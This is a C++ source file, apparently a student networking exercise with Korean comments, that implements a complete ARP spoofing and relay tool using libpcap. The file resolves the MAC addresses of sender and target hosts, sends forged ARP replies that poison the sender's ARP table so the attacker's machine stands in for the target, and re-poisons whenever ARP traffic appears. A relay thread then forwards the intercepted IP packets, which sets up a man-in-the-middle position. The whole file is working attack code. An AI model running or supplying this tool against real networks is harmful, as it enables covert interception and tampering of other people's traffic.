#include <iostream>

#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include <map>
#include <set>
#include <mutex>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

#include <atomic>
#include <condition_variable>
using namespace std;

std::map<Ip, Mac> mac_cache;
std::set<Ip> sender_ips;
std::mutex relay_ip_match_mutex; // Mutex 객체
std::map<Ip, Ip> relay_ip_match;

std::atomic<bool> filter_needs_update(false);
std::mutex filter_mutex;
std::condition_variable filter_cv;

void print_packet_contents(const u_char* packet, int length) {
	printf("-------------PACKET!(%d)--------------------\n", length);
	
    for (int i = 0; i < length; i++) {
        // 16바이트씩 한 줄에 출력
        if (i % 16 == 0) {
            printf("\n%04x  ", i);  // 주소 출력 (offset)
        }
        
        printf("%02x ", packet[i]);  // 각 바이트를 16진수로 출력
        
        // 16바이트씩 끝날 때마다 추가적인 공백을 넣어 가독성을 높임
        if (i % 16 == 15 || i == length - 1) {
            int space = 15 - (i % 16);
            for (int j = 0; j < space; j++) {
                printf("   ");
            }
            printf(" ");
            
            // 해당 16바이트의 ASCII 값 출력
            for (int j = i - (i % 16); j <= i; j++) {
                if (packet[j] >= 32 && packet[j] <= 126) {
                    printf("%c", packet[j]);  // 프린트 가능한 문자는 그대로 출력
                } else {
                    printf(".");  // 그 외에는 점(.)으로 출력
                }
            }
        }
    }
	printf("----------------------------------------");
    printf("\n");
}


// sender_ips의 내용을 출력하는 함수
void print_sender_ips() {
    std::cout << "Current sender_ips contents:\n";
    for (const auto& ip : sender_ips) {
        std::cout << "IP: " << std::string(ip) << std::endl;
    }
    std::cout << "----------------------------------\n";
}
// relay_ip_match 맵을 출력하는 함수
void print_relay_ip_match() {
    //std::lock_guard<std::mutex> lock(relay_ip_match_mutex); // 맵에 접근할 때 뮤텍스를 잠급니다.
    std::cout << "\n----------------------------------\n";
    std::cout << "Current relay_ip_match contents:\n";
    for (const auto& entry : relay_ip_match) {
        std::cout << "Sender IP: " << std::string(entry.first) 
                  << " -> Target IP: " << std::string(entry.second) << std::endl;
    }
    std::cout << "----------------------------------\n";
}
void print_mac_address(const Mac& mac) { 	printf("%s\n", static_cast<std::string>(mac).c_str()); }

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
void find_my_ipmac(const char* dev, Ip *my_ip, Mac* my_mac){
	struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {
        perror("socket");
        return;
    }

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        // MAC 주소를 sender_mac 배열에 저장
        for (int i = 0; i < 6; ++i) {
			*my_mac = Mac(reinterpret_cast<uint8_t*>(s.ifr_addr.sa_data));
        }
    } else {
        perror("ioctl");
    }

	    // IP 주소 찾기
    if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
		*my_ip = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&s.ifr_addr)->sin_addr.s_addr));
    } else {
        perror("ioctl");
    }

    close(fd);
};

void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, const Mac& eth_target_mac, const Mac& arp_sender_mac, const Ip& sender_ip, const Mac& arp_target_mac, const Ip& target_ip){
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
	packet_send.arp_.op_ = htons(ArpHdr::Request);

	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;

	packet_send.eth_.dmac_ = eth_target_mac;
	packet_send.eth_.smac_ = eth_sender_mac;

	packet_send.arp_.smac_ = arp_sender_mac; 
	packet_send.arp_.sip_ = htonl(static_cast<uint32_t>(sender_ip)); 
	
	packet_send.arp_.tmac_ = arp_target_mac;
	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));

}

void change_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){

	EthArpPacket packet_send;
	
	const Mac& broadcast = Mac::broadcastMac();
    const Mac& zero = Mac::nullMac();
	make_send_packet(packet_send, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip);
	
	//send PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	printf("Attack finished\n");
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	printf("sdf\n");
	try {
        // 동기화된 접근을 보장하기 위해 lock_guard를 사용합니다.
        {
            //std::lock_guard<std::mutex> lock(relay_ip_match_mutex);

            printf("add to relay map\n");
            relay_ip_match[sender_ip] = target_ip;
			sender_ips.insert(sender_ip);
			print_sender_ips();
            filter_needs_update = true;  // Indicate that the filter needs to be updated
            filter_cv.notify_one(); // Notify the relay thread
            
        }
    } catch (const std::exception& e) {
        // 예외가 발생하면 에러 메시지를 출력합니다.
        std::cerr << "Exception: " << e.what() << std::endl;
    }
	printf("add to relay map complete, unlock!\n");
	print_relay_ip_match();
};

Mac get_mac_address(pcap_t* handle, const Mac my_mac, const Ip my_ip, const Ip& ip) {
    Mac new_mac_addr;

    auto it = mac_cache.find(ip);
    if (it != mac_cache.end()) {
        new_mac_addr = it->second;
        printf("(already in set) IP(%s) =>  ", static_cast<std::string>(ip).c_str());
        print_mac_address(new_mac_addr);
        return new_mac_addr;
    }

    EthArpPacket packet_send;
    struct pcap_pkthdr* header;
    const u_char* packet_receive;

    const Mac& broadcast = Mac::broadcastMac();
    const Mac& zero = Mac::nullMac();
    make_send_packet(packet_send, my_mac, broadcast, my_mac, my_ip, zero, ip);

    const int max_retries = 5;  // Maximum number of retries
    const int timeout_ms = 1000;  // Timeout for each retry in milliseconds

    for (int attempt = 0; attempt < max_retries; ++attempt) {
        // Send ARP request packet
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        auto start_time = std::chrono::steady_clock::now();

        while (true) {
            res = pcap_next_ex(handle, &header, &packet_receive);
            if (res == 0) {
                // Check for timeout
                auto elapsed_time = std::chrono::steady_clock::now() - start_time;
                if (std::chrono::duration_cast<std::chrono::milliseconds>(elapsed_time).count() > timeout_ms) {
                    break;  // Timeout, retry sending the packet
                }
                continue;
            }
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            printf("Capturing to find IP(%s)'s MAC Address\n", static_cast<std::string>(ip).c_str());
            struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
            if (EAPacket->eth_.type() == EthHdr::Arp
                && (EAPacket->arp_.op() == ArpHdr::Reply)
                && (EAPacket->arp_.sip() == ip)) {
                new_mac_addr = EAPacket->arp_.smac();

                printf("IP(%s) =>  ", static_cast<std::string>(ip).c_str());
                print_mac_address(new_mac_addr);
                mac_cache[ip] = new_mac_addr;
                return new_mac_addr;
            }
        }

        // If we reach here, it means the timeout occurred, and we need to retry
        printf("Retrying to get MAC address for IP(%s), attempt %d\n", static_cast<std::string>(ip).c_str(), attempt + 1);
    }

    printf("Failed to retrieve MAC address for IP(%s) after %d attempts.\n", static_cast<std::string>(ip).c_str(), max_retries);
    return new_mac_addr;  // Return the (likely) empty MAC address
}

int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac, const Ip& sender_ip, const Ip& target_ip){
	
	Mac sender_mac, target_mac;
	sender_mac=get_mac_address(handle, my_mac, my_ip, sender_ip);
	target_mac=get_mac_address(handle, my_mac, my_ip, target_ip);

	printf("\n===========!ARP Table attctk Start!==================\n");

	printf("Sender IP Address: %s, ", static_cast<std::string>(sender_ip).c_str());
	printf("Target IP Address: %s\n", static_cast<std::string>(target_ip).c_str());

	change_arp_table(handle,my_mac, sender_mac, target_ip, sender_ip);

	return 1;
}

void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac) {
    Mac fixed_dmac("f2:a3:5a:d1:5e:64");
    while (true) {
        // Wait until the filter needs to be updated
        std::unique_lock<std::mutex> lock(filter_mutex);
        filter_cv.wait(lock, []{ return filter_needs_update.load(); });

        // Construct the filter expression
        std::string filter_exp = "ether dst " + std::string(my_mac) + " and (";
        {
            std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
            if (sender_ips.empty()) {
                filter_exp = "ether dst " + std::string(my_mac) + " and ip host 0.0.0.0";
            } else {
                for (auto it = sender_ips.begin(); it != sender_ips.end(); ++it) {
                    if (it != sender_ips.begin()) {
                        filter_exp += " or ";
                    }
                    filter_exp += "ip host " + std::string(*it);
                }
            }
        }
        filter_exp += ")";

        // Compile and set the new filter
        struct bpf_program fp;
        if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
            fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
            continue;
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "pcap_setfilter failed: %s\n", pcap_geterr(handle));
            pcap_freecode(&fp);
            continue;
        }
        pcap_freecode(&fp);

        filter_needs_update = false;  // Reset the update flag
        lock.unlock();

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res;

        while (true) {
            res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue; // Timeout
            if (res == -1 || res == -2) break; // Error or EOF

            EthHdr* eth_hdr = (EthHdr*)packet;

            if (eth_hdr->type() == EthHdr::Arp) {
                // Handle ARP packet
                ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
                Ip src_ip = arp_hdr->sip();
                Ip dst_ip = arp_hdr->tip();
                printf("---------------------RELAY START-------------------\n");
                printf("Received ARP packet from %s to %s\n", 
                       std::string(src_ip).c_str(), 
                       std::string(dst_ip).c_str());

                performArpAttack(handle, dev, my_ip, my_mac, src_ip, dst_ip);
                printf("---------------------------------------------------\n");

                
            }else {

            IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));

            Ip src_ip = ip_hdr->sip();
            Ip dst_ip = ip_hdr->dip();
            // printf("---------------------RELAY START-------------------\n");

            // printf("Captured IPv4 packet from %s to %s\n",
            //        std::string(src_ip).c_str(),
            //        std::string(dst_ip).c_str());

            Mac new_dmac = get_mac_address(handle, my_mac, my_ip, relay_ip_match[src_ip]);
                       // Check if src_ip has a corresponding relay MAC
            {
                std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
                if (relay_ip_match.find(src_ip) != relay_ip_match.end()
                && dst_ip== relay_ip_match[src_ip]) {
                    
                    // Modify MAC addresses
                    eth_hdr->smac_ = my_mac;
                    
                    eth_hdr->dmac_ =new_dmac;
                    // eth_hdr->dmac_ =fixed_dmac;

                    // Recalculate checksums if necessary (usually needed for IP, TCP, UDP headers)
                    // Example (pseudo code, actual recalculation depends on your environment):
                    // ip_hdr->checksum = recalculate_ip_checksum(ip_hdr);

                    // Resend the packet
                    if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
                        fprintf(stderr, "Error resending packet: %s\n", pcap_geterr(handle));
                    } else {
                        printf("---------------------RELAY START-------------------\n");
                        printf("Relayed packet from %s to %s\n", 
                               std::string(src_ip).c_str(), 
                               std::string(dst_ip).c_str());
                         printf("---------------------------------------------------\n");
                    }
                }
            }}
        }
    }
}




int main(int argc, char* argv[]) {

	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	printf("argc: %d\n", argc);
	//총 (argc-2)/2번을 반복문 돌아야 함.

	Ip my_ip, sender_ip, target_ip;
	Mac my_mac, sender_mac, target_mac;

	//find_my_mac(dev, my_mac);
	printf("==============Basic Information================\n");
	find_my_ipmac(dev, &my_ip, &my_mac);
	printf("My IP Address: %s\n",  static_cast<std::string>(my_ip).c_str());
	printf("My Mac Address: ");
	print_mac_address(my_mac);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf2);
	if (handle2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
		return -1;
	}

	//char buffer[INET_ADDRSTRLEN];
	// std::thread relayThread(relay_packets, dev, handle2, my_ip, my_mac);
	 std::thread relayThread(relay_packets, handle2, dev, std::ref(my_ip), std::ref(my_mac));
	for (int i=2; i<argc; i+=2){
		//std::thread relayThread(relay_ip_packet, handle, my_mac);

		 sender_ip = Ip(argv[i]);
		 target_ip = Ip(argv[i+1]);
		
		performArpAttack(handle, dev, my_ip, my_mac, sender_ip, target_ip);
		
	}
	//relay_packets(handle, my_mac);
	relayThread.join();
	pcap_close(handle);
    pcap_close(handle2);
}
